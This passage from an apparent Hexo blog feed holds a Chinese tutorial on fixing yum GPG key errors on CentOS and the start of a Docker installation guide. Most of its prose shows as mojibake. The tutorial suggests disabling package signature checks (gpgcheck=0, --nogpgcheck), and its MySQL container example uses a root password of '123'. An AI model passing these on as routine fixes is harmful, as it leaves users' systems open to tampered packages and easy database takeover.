variable">gpgkey</span><span class="token operator">=</span>file:///etc/pki/rpm-gpg/RPM-GPG-KEY-CentOS-6<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ã€åé¢çš„è¸©çš„å‘ï¼Œgpgkey=file:///etc/pki/rpm-gpg/RPM-GPG-KEY-CentOS-6æ”¹æˆgpgkey=file:///etc/pki/rpm-gpg/RPM-GPG-KEY-CentOS-7ã€‘</p><ul><li>æ¸…ç†æ›´æ–°ç¼“å­˜</li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment">#æ¸…ç©ºyumç¼“å­˜</span>yum clean all<span class="token comment">#é‡å»ºyumç¼“å­˜</span>yum makecache<span class="token comment">#åˆ—å‡ºyumåˆ—è¡¨</span>yum list<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><img src="/2024/12/12/xu-ni-hua-ji-zhu/centos-xu-ni-ji-an-zhuang-ji-wen-ti-jie-jue/%E6%88%AA%E5%B1%8F2024-12-12%2016.41.24.png" style="zoom:30%;"><h3 id="2-4-5-é‡æ–°å®‰è£…net-tools"><a href="#2-4-5-é‡æ–°å®‰è£…net-tools" class="headerlink" title="2.4.5 é‡æ–°å®‰è£…net-tools"></a>2.4.5 é‡æ–°å®‰è£…net-tools</h3><p><img src="/2024/12/12/xu-ni-hua-ji-zhu/centos-xu-ni-ji-an-zhuang-ji-wen-ti-jie-jue/%E6%88%AA%E5%B1%8F2024-12-12%2016.54.45.png" alt="æˆªå±2024-12-12 16.54.45"></p><blockquote><ul><li>é—®é¢˜è§£å†³æ–¹æ³•ï¼š</li></ul><p>ï¼ˆæ–¹æ³•1ï¼‰</p><p>è¿™ä¸ªå°±æ˜¯å®‰è£…çš„æ—¶å€™ä¼šæ£€æŸ¥keyã€‚</p><p>åœ¨repoæ–‡ä»¶ä¸­å…³é—­å³å¯ã€‚</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">vim</span> /etc/yum.repos.d/epel.repo<span class="token punctuation">[</span>epel<span class="token punctuation">]</span><span class="token assign-left variable">name</span><span class="token operator">=</span>Extra Packages <span class="token keyword">for</span> Enterprise Linux <span class="token number">7</span> - <span class="token variable">$basearch</span><span class="token comment">#baseurl=http://download.fedoraproject.org/pub/epel/7/$basearch</span><span class="token assign-left variable">metalink</span><span class="token operator">=</span>https://mirrors.fedoraproject.org/metalink?repo<span class="token operator">=</span>epel-7<span class="token operator">&amp;</span><span class="token assign-left variable">arch</span><span class="token operator">=</span><span class="token variable">$basearch</span> <span class="token assign-left variable">failovermethod</span><span class="token operator">=</span>priority<span class="token assign-left variable">enabled</span><span class="token operator">=</span><span class="token number">1</span><span class="token assign-left variable">pgcheck</span><span class="token operator">=</span><span class="token number">1</span><span class="token assign-left variable">gpgkey</span><span class="token operator">=</span>file:///etc/pki/rpm-gpg/RPM-GPG-KEY-EPEL-7<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æŠŠgpgcheck=1  æ”¹ä¸ºgpgcheck=0 å³å¯ï¼Œæ„æ€æ˜¯åœ¨å®‰è£…çš„æ—¶å€™ä¸è¿›è¡Œæºçš„æ£€æŸ¥</p><img src="/2024/12/12/xu-ni-hua-ji-zhu/centos-xu-ni-ji-an-zhuang-ji-wen-ti-jie-jue/%E6%88%AA%E5%B1%8F2024-12-12%2016.58.38.png" style="zoom:40%;"><p>ä½†æ˜¯å¹¶æ²¡æœ‰è¿™ä¸ªæ–‡ä»¶ã€‚</p><p>å°è¯•æ–°å»ºä¸€ä¸ªæ–‡ä»¶å†™å…¥ç›¸å…³å†…å®¹ã€‚</p><p>åŠ å…¥è¿™ä¸ªæ–‡ä»¶ä¹‹åyum updateéƒ½å­˜åœ¨é—®é¢˜äº†ã€‚</p><img src="/2024/12/12/xu-ni-hua-ji-zhu/centos-xu-ni-ji-an-zhuang-ji-wen-ti-jie-jue/%E6%88%AA%E5%B1%8F2024-12-12%2017.08.37.png" style="zoom:30%;"><p>â€¦.CentOS-7çš„å¯†é’¥æ˜¯å­˜åœ¨çš„ï¼Œä¸ºä»€ä¹ˆä¼šæ£€æŸ¥CentOS-6ï¼ŒåŸå› æ˜¯ä¹‹å‰é…ç½®yumæºçš„gpgkeyçš„é…ç½®ã€‚æ”¹æˆCentOS-7å³å¯ã€‚</p><img src="/2024/12/12/xu-ni-hua-ji-zhu/centos-xu-ni-ji-an-zhuang-ji-wen-ti-jie-jue/%E6%88%AA%E5%B1%8F2024-12-12%2017.09.53.png" style="zoom:50%;"><p>ï¼ˆæ–¹æ³•2ï¼‰</p><p># åœ¨yum install ç‰ˆæœ¬åé¢åŠ ä¸Š â€“nogpgcheckï¼Œå³å¯ç»•è¿‡GPGéªŒè¯æˆåŠŸå®‰è£…<br>ã€€ã€€yum install mysql-community-server â€“nogpgcheck</p><p>ä½†è¿™ä¸ªæ–¹æ³•ä¸é•¿ä¹…ï¼Œæ¯æ¬¡éƒ½å¾—å¤šåŠ å‚æ•°ã€‚</p></blockquote><p>é‡æ–°å®‰è£…net-tools</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">yum <span class="token function">install</span> net-tools<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2024/12/12/xu-ni-hua-ji-zhu/centos-xu-ni-ji-an-zhuang-ji-wen-ti-jie-jue/%E6%88%AA%E5%B1%8F2024-12-12%2017.13.53.png" style="zoom:50%;"><p>æˆåŠŸä¹‹åæ‰§è¡Œifconfigå‘½ä»¤ï¼ŒæˆåŠŸæ‰§è¡Œã€‚</p><h1 id="å‚è€ƒï¼š"><a href="#å‚è€ƒï¼š" class="headerlink" title="å‚è€ƒï¼š"></a>å‚è€ƒï¼š</h1><p><a href="https://b11et3un53m.feishu.cn/wiki/Rfocw7ctXij2RBkShcucLZbrn2d">https://b11et3un53m.feishu.cn/wiki/Rfocw7ctXij2RBkShcucLZbrn2d</a> </p>]]></content>
      
      
      <categories>
          
          <category> è™šæ‹ŸåŒ–æŠ€æœ¯ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> è™šæ‹Ÿæœºå®‰è£… </tag>
            
            <tag> centoså®‰è£… </tag>
            
            <tag> yumæºé…ç½® </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>dockerå…¥é—¨åˆ°è¿›é˜¶</title>
      <link href="/2024/12/12/xu-ni-hua-ji-zhu/docker-ru-men-dao-jin-jie/"/>
      <url>/2024/12/12/xu-ni-hua-ji-zhu/docker-ru-men-dao-jin-jie/</url>
      
        <content type="html"><![CDATA[<h1 id="ä¸€ã€Dockerç®€ä»‹"><a href="#ä¸€ã€Dockerç®€ä»‹" class="headerlink" title="ä¸€ã€Dockerç®€ä»‹"></a>ä¸€ã€Dockerç®€ä»‹</h1><p>Docker æ˜¯ä¸€ç§å¼€æºçš„å®¹å™¨åŒ–æŠ€æœ¯ï¼Œèƒ½å¤Ÿå°†åº”ç”¨åŠå…¶ä¾èµ–æ‰“åŒ…è¿›è½»é‡çº§ã€å¯ç§»æ¤çš„å®¹å™¨ä¸­ï¼Œå®ç°å¿«é€Ÿéƒ¨ç½²å’Œè·¨å¹³å°è¿è¡Œã€‚</p><p>å³ï¼šDockeræ˜¯ä¸€ä¸ªå¿«é€Ÿæ„å»ºã€è¿è¡Œã€ç®¡ç†åº”ç”¨çš„å·¥å…·ã€‚</p><h2 id="1-1-é•œåƒå’Œå®¹å™¨"><a href="#1-1-é•œåƒå’Œå®¹å™¨" class="headerlink" title="1.1 é•œåƒå’Œå®¹å™¨"></a>1.1 é•œåƒå’Œå®¹å™¨</h2><p>å½“æˆ‘ä»¬åˆ©ç”¨Dockerå®‰è£…åº”ç”¨æ—¶ï¼ŒDockerä¼šè‡ªåŠ¨æœç´¢å¹¶ä¸‹è½½åº”ç”¨é•œåƒï¼ˆimageï¼‰ã€‚é•œåƒä¸ä»…åŒ…å«åº”ç”¨æœ¬èº«ï¼Œè¿˜åŒ…å«åº”ç”¨è¿è¡Œæ‰€éœ€è¦çš„ç¯å¢ƒã€é…ç½®ã€ç³»ç»Ÿå‡½æ•°åº“ã€‚Dockerä¼šåœ¨è¿è¡Œé•œåƒæ—¶åˆ›å»ºä¸€ä¸ªéš”ç¦»ç¯å¢ƒï¼Œç§°ä¸ºå®¹å™¨ï¼ˆcontainerï¼‰ã€‚</p><p>é•œåƒä»“åº“ï¼šå­˜å‚¨å’Œç®¡ç†é•œåƒçš„å¹³å°ï¼ŒDockerå®˜æ–¹ç»´æŠ¤äº†ä¸€ä¸ªå…¬å…±ä»“åº“ï¼š<a href="https://hub.docker.com/">Docker Hub</a>ã€‚</p><p>ä¸‹å›¾æ‰€ç¤ºä¸ºdockerã€å®¹å™¨ã€é•œåƒå’Œé•œåƒä»“åº“çš„é€»è¾‘å…³ç³»ï¼š</p><img src="/2024/12/12/xu-ni-hua-ji-zhu/docker-ru-men-dao-jin-jie/%E6%88%AA%E5%B1%8F2024-12-12%2009.49.19.png" style="zoom:50%;"><ul><li><p>å®¹å™¨ï¼ˆContainerï¼‰æ˜¯ä¸€ç§è½»é‡çº§çš„ã€å¯æ‰§è¡Œçš„è½¯ä»¶åŒ…ï¼Œå®ƒå°†ä»£ç å’Œç¯å¢ƒæ‰“åŒ…åœ¨ä¸€èµ·ï¼Œç¡®ä¿åº”ç”¨åœ¨ä»»ä½•åœ°æ–¹éƒ½èƒ½ä»¥ç›¸åŒçš„æ–¹å¼è¿è¡Œã€‚å®¹å™¨æ˜¯ç‹¬ç«‹ä¸”éš”ç¦»çš„ï¼Œè¿è¡Œåœ¨å®¿ä¸»æœºä¸Šï¼Œå…±äº«æ“ä½œç³»ç»Ÿå†…æ ¸ï¼Œä½†ä¸å…¶ä»–å®¹å™¨ç›¸äº’éš”ç¦»ã€‚</p></li><li><p>é•œåƒï¼ˆImageï¼‰æ˜¯å®¹å™¨è¿è¡Œçš„æ¨¡æ¿ï¼ŒåŒ…å«äº†è¿è¡Œå®¹å™¨æ‰€éœ€çš„ä»£ç ã€è¿è¡Œæ—¶ã€ç³»ç»Ÿå·¥å…·ã€ç³»ç»Ÿåº“ç­‰ã€‚é•œåƒæ˜¯åªè¯»çš„ï¼Œå¯ä»¥è¢«å¤šä¸ªå®¹å™¨å®ä¾‹å…±äº«ï¼Œç¡®ä¿äº†ç¯å¢ƒçš„ä¸€è‡´æ€§ã€‚</p></li><li><p>ä»“åº“ï¼ˆRepositoryï¼‰æ˜¯å­˜æ”¾å®¹å™¨é•œåƒçš„åœºæ‰€ï¼Œå¯ä»¥æ˜¯æœ¬åœ°çš„ä¹Ÿå¯ä»¥æ˜¯è¿œç¨‹çš„ã€‚å¸¸ç”¨çš„è¿œç¨‹ä»“åº“åŒ…æ‹¬ Docker Hub å’Œç§æœ‰ä»“åº“ã€‚å¼€å‘è€…å°†é•œåƒæ¨é€åˆ°ä»“åº“ä¸­ï¼Œå…¶ä»–ç”¨æˆ·å¯ä»¥ä»ä»“åº“ä¸­æ‹‰å–é•œåƒæ¥åˆ›å»ºå’Œè¿è¡Œå®¹å™¨ã€‚</p></li></ul><blockquote><p>Dockeræ˜¯åšä»€ä¹ˆçš„ï¼Ÿ</p><ul><li>Dockerå¯ä»¥å¸®åŠ©æˆ‘ä»¬ä¸‹è½½åº”ç”¨é•œåƒï¼Œåˆ›å»ºå¹¶è¿è¡Œé•œåƒçš„å®¹å™¨ï¼Œä»è€Œå¿«é€Ÿéƒ¨ç½²åº”ç”¨ã€‚</li></ul><p>ä»€ä¹ˆæ˜¯é•œåƒï¼Ÿ</p><ul><li>å°†åº”ç”¨æ‰€éœ€çš„å‡½æ•°åº“ã€ä¾èµ–ã€é…ç½®ç­‰ä¸åº”ç”¨ä¸€èµ·æ‰“åŒ…å¾—åˆ°çš„å°±æ˜¯é•œåƒã€‚</li></ul><p>ä»€ä¹ˆæ˜¯å®¹å™¨?</p><ul><li>ä¸ºæ¯ä¸ªé•œåƒçš„åº”ç”¨è¿›ç¨‹åˆ›å»ºçš„éš”ç¦»è¿è¡Œç¯å¢ƒå°±æ˜¯å®¹å™¨ã€‚</li></ul><p>ä»€ä¹ˆæ˜¯é•œåƒä»“åº“?</p><ul><li>å­˜å‚¨å’Œç®¡ç†é•œåƒçš„æœåŠ¡å°±æ˜¯é•œåƒä»“åº“ï¼ŒDockerHubæ˜¯ç›®å‰æœ€å¤§çš„é•œåƒä»“åº“ï¼Œå…¶ä¸­åŒ…å«å„ç§å¸¸è§çš„åº”ç”¨é•œåƒã€‚</li></ul></blockquote><h1 id="äºŒã€Dockerå®‰è£…"><a href="#äºŒã€Dockerå®‰è£…" class="headerlink" title="äºŒã€Dockerå®‰è£…"></a>äºŒã€Dockerå®‰è£…</h1><h2 id="2-1-è™šæ‹Ÿæœºç³»ç»Ÿå‡†å¤‡"><a href="#2-1-è™šæ‹Ÿæœºç³»ç»Ÿå‡†å¤‡" class="headerlink" title="2.1 è™šæ‹Ÿæœºç³»ç»Ÿå‡†å¤‡"></a>2.1 è™šæ‹Ÿæœºç³»ç»Ÿå‡†å¤‡</h2><p>è§ã€centosè™šæ‹Ÿæœºå®‰è£…åŠé—®é¢˜è§£å†³ã€‘ä¸€æ–‡ã€‚</p><p>æˆ‘æœ€åç”¨çš„ç³»ç»Ÿï¼Œcentos7</p><img src="/2024/12/12/xu-ni-hua-ji-zhu/docker-ru-men-dao-jin-jie/%E6%88%AA%E5%B1%8F2024-12-12%2017.19.27.png" style="zoom:50%;"><h2 id="2-2-å¸è½½æ—§ç‰ˆDocker"><a href="#2-2-å¸è½½æ—§ç‰ˆDocker" class="headerlink" title="2.2 å¸è½½æ—§ç‰ˆDocker"></a>2.2 å¸è½½æ—§ç‰ˆDocker</h2><p>é¦–å…ˆå¦‚æœç³»ç»Ÿä¸­å·²ç»å­˜åœ¨æ—§çš„Dockerï¼Œåˆ™å…ˆå¸è½½ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">yum remove <span class="token function">docker</span> <span class="token punctuation">\</span>    docker-client <span class="token punctuation">\</span>    docker-client-latest <span class="token punctuation">\</span>    docker-common <span class="token punctuation">\</span>    docker-latest <span class="token punctuation">\</span>    docker-latest-logrotate <span class="token punctuation">\</span>    docker-logrotate <span class="token punctuation">\</span>    docker-engine <span class="token punctuation">\</span>    docker-selinux <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><img src="/2024/12/12/xu-ni-hua-ji-zhu/docker-ru-men-dao-jin-jie/%E6%88%AA%E5%B1%8F2024-12-12%2017.18.18.png" alt="æˆªå±2024-12-12 17.18.18" style="zoom:35%;"><p>æˆ‘çš„è™šæ‹Ÿæœºä¸Šæ²¡æœ‰éœ€è¦åˆ é™¤çš„dockerç›¸å…³çš„åŒ…ã€‚</p><h2 id="2-3-é…ç½®Dockerçš„yumæº"><a href="#2-3-é…ç½®Dockerçš„yumæº" class="headerlink" title="2.3 é…ç½®Dockerçš„yumæº"></a>2.3 é…ç½®Dockerçš„yumæº</h2><h3 id="2-3-1-yumå·¥å…·åŒ…å®‰è£…"><a href="#2-3-1-yumå·¥å…·åŒ…å®‰è£…" class="headerlink" title="2.3.1 yumå·¥å…·åŒ…å®‰è£…"></a>2.3.1 yumå·¥å…·åŒ…å®‰è£…</h3><p>é¦–å…ˆè¦å®‰è£…ä¸€ä¸ªyumå·¥å…·ã€‚</p><pre class="line-numbers language-Bash" data-language="Bash"><code class="language-Bash">sudo yum install -y yum-utils device-mapper-persistent-data lvm2<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2024/12/12/xu-ni-hua-ji-zhu/docker-ru-men-dao-jin-jie/%E6%88%AA%E5%B1%8F2024-12-12%2017.21.05.png" style="zoom:50%;"><h3 id="2-3-2-é…ç½®yumæº"><a href="#2-3-2-é…ç½®yumæº" class="headerlink" title="2.3.2 é…ç½®yumæº"></a>2.3.2 é…ç½®yumæº</h3><p>å®‰è£…æˆåŠŸåï¼Œæ‰§è¡Œå‘½ä»¤ï¼Œé…ç½®Dockerçš„yumæºï¼ˆå·²æ›´æ–°ä¸ºé˜¿é‡Œäº‘æºï¼‰ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> yum-config-manager --add-repo https://mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.repo<span class="token function">sudo</span> <span class="token function">sed</span> <span class="token parameter variable">-i</span> <span class="token string">'s+download.docker.com+mirrors.aliyun.com/docker-ce+'</span> /etc/yum.repos.d/docker-ce.repo<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="/2024/12/12/xu-ni-hua-ji-zhu/docker-ru-men-dao-jin-jie/%E6%88%AA%E5%B1%8F2024-12-12%2017.21.54.png" alt="æˆªå±2024-12-12 17.21.54"></p><blockquote><p>sudo sed -i â€˜s+download.docker.com+mirrors.aliyun.com/docker-ce+â€™ /etc/yum.repos.d/docker-ce.repo</p><p>å‘½ä»¤è§£é‡Šï¼š</p><ol><li><code>sed</code>: è°ƒç”¨sedå·¥å…·ï¼Œå®ƒæ˜¯ä¸€ä¸ªæµç¼–è¾‘å™¨ï¼Œç”¨äºå¯¹æ–‡æœ¬è¿›è¡Œè¿‡æ»¤å’Œæ›¿æ¢ã€‚</li><li><code>-i</code>: é€‰é¡¹å‘Šè¯‰sedç›´æ¥åœ¨æ–‡ä»¶ä¸­è¿›è¡Œç¼–è¾‘ï¼Œè€Œä¸æ˜¯è¾“å‡ºåˆ°æ ‡å‡†è¾“å‡ºï¼ˆå³ç»ˆç«¯ï¼‰ã€‚è¿™ä¼šå¯¼è‡´åŸæ–‡ä»¶è¢«ä¿®æ”¹ã€‚</li><li><code>'s+download.docker.com+mirrors.aliyun.com/docker-ce+'</code>: è¿™æ˜¯ä¸€ä¸ªsedçš„æ›¿æ¢å‘½ä»¤ï¼Œå®ƒæŒ‡ç¤ºsedæ‰§è¡Œä»¥ä¸‹æ“ä½œï¼š<ul><li><code>s</code>: è¡¨ç¤ºæ›¿æ¢ï¼ˆsubstituteï¼‰ã€‚</li><li><code>+</code>: åœ¨sedä¸­ç”¨ä½œåˆ†éš”ç¬¦ï¼Œè¿™é‡Œå®ƒæ›¿ä»£äº†é»˜è®¤çš„ç©ºæ ¼åˆ†éš”ç¬¦ï¼Œå› ä¸ºé»˜è®¤çš„ç©ºæ ¼åœ¨URLä¸­ä¼šå‡ºç°ï¼Œä½¿ç”¨<code>+</code>å¯ä»¥é¿å…è¿™ç§æƒ…å†µã€‚</li><li><code>download.docker.com</code>: è¿™æ˜¯è¦è¢«æ›¿æ¢çš„å­—ç¬¦ä¸²ï¼Œå³åŸå§‹çš„Dockeré•œåƒæºåœ°å€ã€‚</li><li><code>mirrors.aliyun.com/docker-ce</code>: è¿™æ˜¯æ›¿æ¢åçš„å­—ç¬¦ä¸²ï¼Œå³é˜¿é‡Œäº‘çš„Dockeré•œåƒæºåœ°å€ã€‚</li></ul></li><li><code>/etc/yum.repos.d/docker-ce.repo</code>: æŒ‡å®šäº†è¦ç¼–è¾‘çš„æ–‡ä»¶è·¯å¾„ã€‚è¿™ä¸ªæ–‡ä»¶æ˜¯Docker CEï¼ˆç¤¾åŒºç‰ˆï¼‰çš„YUMä»“åº“é…ç½®æ–‡ä»¶ã€‚</li></ol></blockquote><h3 id="2-3-3-æ›´æ–°yumï¼Œå»ºç«‹ç¼“å­˜"><a href="#2-3-3-æ›´æ–°yumï¼Œå»ºç«‹ç¼“å­˜" class="headerlink" title="2.3.3 æ›´æ–°yumï¼Œå»ºç«‹ç¼“å­˜"></a>2.3.3 æ›´æ–°yumï¼Œå»ºç«‹ç¼“å­˜</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> yum makecache fast<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2024/12/12/xu-ni-hua-ji-zhu/docker-ru-men-dao-jin-jie/%E6%88%AA%E5%B1%8F2024-12-12%2017.22.36.png" style="zoom:40%;"><h2 id="2-4-å®‰è£…Docker"><a href="#2-4-å®‰è£…Docker" class="headerlink" title="2.4 å®‰è£…Docker"></a>2.4 å®‰è£…Docker</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">yum <span class="token function">install</span> <span class="token parameter variable">-y</span> docker-ce docker-ce-cli containerd.io docker-buildx-plugin docker-compose-plugin<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2024/12/12/xu-ni-hua-ji-zhu/docker-ru-men-dao-jin-jie/%E6%88%AA%E5%B1%8F2024-12-12%2017.27.07.png" style="zoom:50%;"><h2 id="2-5-å¯åŠ¨å’Œæ ¡éªŒå®‰è£…æ˜¯å¦æˆåŠŸ"><a href="#2-5-å¯åŠ¨å’Œæ ¡éªŒå®‰è£…æ˜¯å¦æˆåŠŸ" class="headerlink" title="2.5 å¯åŠ¨å’Œæ ¡éªŒå®‰è£…æ˜¯å¦æˆåŠŸ"></a>2.5 å¯åŠ¨å’Œæ ¡éªŒå®‰è£…æ˜¯å¦æˆåŠŸ</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># æŸ¥çœ‹dockerçŠ¶æ€</span>systemctl status <span class="token function">docker</span><span class="token comment"># å¯åŠ¨Docker</span>systemctl start <span class="token function">docker</span><span class="token comment"># åœæ­¢Docker</span>systemctl stop <span class="token function">docker</span><span class="token comment"># é‡å¯</span>systemctl restart <span class="token function">docker</span><span class="token comment"># è®¾ç½®å¼€æœºè‡ªå¯</span>systemctl <span class="token builtin class-name">enable</span> <span class="token function">docker</span><span class="token comment"># æ‰§è¡Œdocker pså‘½ä»¤ï¼Œå¦‚æœä¸æŠ¥é”™ï¼Œè¯´æ˜å®‰è£…å¯åŠ¨æˆåŠŸ</span><span class="token function">docker</span> <span class="token function">ps</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><img src="/2024/12/12/xu-ni-hua-ji-zhu/docker-ru-men-dao-jin-jie/%E6%88%AA%E5%B1%8F2024-12-12%2017.29.23.png" style="zoom:50%;"><img src="/2024/12/12/xu-ni-hua-ji-zhu/docker-ru-men-dao-jin-jie/%E6%88%AA%E5%B1%8F2024-12-12%2017.30.03.png" style="zoom:50%;"><img src="/2024/12/12/xu-ni-hua-ji-zhu/docker-ru-men-dao-jin-jie/%E6%88%AA%E5%B1%8F2024-12-12%2017.32.21.png" alt="æˆªå±2024-12-12 17.32.21" style="zoom:40%;"><h2 id="2-6-é…ç½®é•œåƒåŠ é€Ÿ"><a href="#2-6-é…ç½®é•œåƒåŠ é€Ÿ" class="headerlink" title="2.6 é…ç½®é•œåƒåŠ é€Ÿ"></a>2.6 é…ç½®é•œåƒåŠ é€Ÿ</h2><p>é˜¿é‡Œäº‘dockeré•œåƒåŠ é€Ÿï¼š</p><p><a href="https://help.aliyun.com/zh/acr/user-guide/accelerate-the-pulls-of-docker-official-images">https://help.aliyun.com/zh/acr/user-guide/accelerate-the-pulls-of-docker-official-images</a></p><h3 id="2-6-1-è·å–é•œåƒåŠ é€Ÿå™¨åœ°å€"><a href="#2-6-1-è·å–é•œåƒåŠ é€Ÿå™¨åœ°å€" class="headerlink" title="2.6.1 è·å–é•œåƒåŠ é€Ÿå™¨åœ°å€"></a>2.6.1 è·å–é•œåƒåŠ é€Ÿå™¨åœ°å€</h3><ol><li>ç™»å½•<a href="https://cr.console.aliyun.com/?spm=a2c4g.11186623.0.0.27881d82aiM6LW">å®¹å™¨é•œåƒæœåŠ¡æ§åˆ¶å°</a>ã€‚</li><li>åœ¨å·¦ä¾§å¯¼èˆªæ é€‰æ‹©<em><strong>*é•œåƒå·¥å…·** &gt; **é•œåƒåŠ é€Ÿå™¨*</strong></em></li><li>åœ¨<strong>é•œåƒåŠ é€Ÿå™¨</strong>é¡µé¢è·å–<strong>åŠ é€Ÿå™¨åœ°å€</strong>ã€‚</li></ol><h3 id="2-6-2-é…ç½®é•œåƒåŠ é€Ÿå™¨"><a href="#2-6-2-é…ç½®é•œåƒåŠ é€Ÿå™¨" class="headerlink" title="2.6.2 é…ç½®é•œåƒåŠ é€Ÿå™¨"></a>2.6.2 é…ç½®é•œåƒåŠ é€Ÿå™¨</h3><p>Dockerå’ŒContainerdçš„é•œåƒåŠ é€Ÿå™¨é…ç½®æ–¹æ³•æœ‰æ‰€ä¸åŒã€‚æ‚¨å¯ä»¥æ ¹æ®å…·ä½“æƒ…å†µé€‰æ‹©åˆé€‚çš„é…ç½®æ–¹å¼ã€‚</p><p>å¯ä»¥å…ˆä½¿ç”¨<code>docker --version</code>æŸ¥çœ‹Dockerçš„ç‰ˆæœ¬ï¼Œç„¶åæ ¹æ®å®é™…æƒ…å†µé€‰æ‹©ä¸åŒçš„é…ç½®æ–¹å¼ã€‚</p><img src="/2024/12/12/xu-ni-hua-ji-zhu/docker-ru-men-dao-jin-jie/%E6%88%AA%E5%B1%8F2024-12-12%2017.42.13.png" style="zoom:50%;"><h3 id="æ–°ç‰ˆæœ¬Dockerï¼ˆ1-10åŠä»¥ä¸Šï¼‰"><a href="#æ–°ç‰ˆæœ¬Dockerï¼ˆ1-10åŠä»¥ä¸Šï¼‰" class="headerlink" title="æ–°ç‰ˆæœ¬Dockerï¼ˆ1.10åŠä»¥ä¸Šï¼‰"></a><strong>æ–°ç‰ˆæœ¬Dockerï¼ˆ1.10åŠä»¥ä¸Šï¼‰</strong></h3><p>åˆ›å»ºå¹¶ç¼–è¾‘<code>/etc/docker/daemon.json</code>æ–‡ä»¶ï¼ˆå¦‚æœæ–‡ä»¶ä¸å­˜åœ¨ï¼Œåˆ™åˆ›å»ºï¼‰ï¼š</p><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">{</span>    <span class="token property">"registry-mirrors"</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token string">"&lt;é•œåƒåŠ é€Ÿå™¨åœ°å€&gt;"</span><span class="token punctuation">]</span><span class="token punctuation">}</span>            <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">mkdir</span> <span class="token parameter variable">-p</span> /etc/docker<span class="token function">sudo</span> <span class="token function">tee</span> /etc/docker/daemon.json <span class="token operator">&lt;&lt;-</span><span class="token string">'EOF'{  "registry-mirrors": ["https://xxxxxxxx.aliyuncs.com"]}EOF</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ç„¶åé‡å¯Docker Daemonã€‚</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> systemctl daemon-reload<span class="token function">sudo</span> systemctl restart <span class="token function">docker</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h1 id="ä¸‰ã€Dockerå¿«é€Ÿå…¥é—¨ï¼ˆä¸€é”®éƒ¨ç½²mysqlï¼‰"><a href="#ä¸‰ã€Dockerå¿«é€Ÿå…¥é—¨ï¼ˆä¸€é”®éƒ¨ç½²mysqlï¼‰" class="headerlink" title="ä¸‰ã€Dockerå¿«é€Ÿå…¥é—¨ï¼ˆä¸€é”®éƒ¨ç½²mysqlï¼‰"></a>ä¸‰ã€Dockerå¿«é€Ÿå…¥é—¨ï¼ˆä¸€é”®éƒ¨ç½²mysqlï¼‰</h1><h2 id="3-1-ä¸€é”®éƒ¨ç½²mysql"><a href="#3-1-ä¸€é”®éƒ¨ç½²mysql" class="headerlink" title="3.1 ä¸€é”®éƒ¨ç½²mysql"></a>3.1 ä¸€é”®éƒ¨ç½²mysql</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">docker</span> run <span class="token parameter variable">-d</span> <span class="token parameter variable">--name</span> ms <span class="token parameter variable">-p</span> <span class="token number">3306</span>:3306 <span class="token parameter variable">-e</span> <span class="token assign-left variable">MYSQL_ROOT_PASSWORD</span><span class="token operator">=</span><span class="token number">123</span> mysql<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>å‘½ä»¤è§£è¯»ï¼š</p><p><strong>docker run</strong> ï¼šåˆ›å»ºå¹¶è¿è¡Œä¸€ä¸ªå®¹å™¨ï¼Œ**-d** æ˜¯è®©å®¹å™¨åœ¨åå°è¿è¡Œ</p><p><strong>â€“name mysql</strong> ï¼šç»™å®¹å™¨èµ·ä¸ªåå­—ï¼Œå¿…é¡»å”¯ä¸€</p><p><strong>-p 3306:3306</strong> ï¼šè®¾ç½®ç«¯å£æ˜ å°„ ï¼Œ&lt;å®¿ä¸»æœºç«¯å£&gt;:&lt;å®¹å™¨ç«¯å£&gt;</p><p><strong>-e KEY=VALUE</strong> ï¼šæ˜¯è®¾ç½®ç¯å¢ƒå˜é‡</p><p><strong>mysql</strong> ï¼šæŒ‡å®šè¿è¡Œçš„é•œåƒçš„åå­—</p></blockquote><img 